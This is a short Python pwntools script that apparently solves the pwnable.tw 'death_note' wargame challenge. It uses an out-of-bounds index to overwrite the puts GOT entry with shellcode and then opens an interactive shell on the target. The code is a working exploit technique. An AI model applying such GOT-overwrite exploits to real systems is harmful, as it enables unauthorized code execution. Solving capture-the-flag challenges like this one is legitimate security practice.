#!/usr/bin/env python3
from pwn import *

DWORD = 4
elf = ELF("./given/death_note")

def conn():
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10201)
    else:
        p = process([elf.path])
        if args.D:
            gdb.attach(p, "b *add_note+160")
    return p

def add_note(idx, content, p):
    p.recvuntil(b"Your choice :")
    p.sendline(b"1")
    p.recvuntil(b"Index :")
    p.send(str(idx).encode())
    p.recvuntil(b"Name :")
    p.sendline(content)

def shellcode():
    with open("shellcode/shellcode.bin", "rb") as f:
        sc = f.read()
        f.close()
    return sc

def exploit():
    p = conn()
    data_note = 0x804a060
    got_idx = (elf.got['puts'] - data_note)// DWORD
    print("got_idx", got_idx)
    add_note(got_idx, shellcode(), p)
    p.interactive()

if __name__ == '__main__':
    exploit()


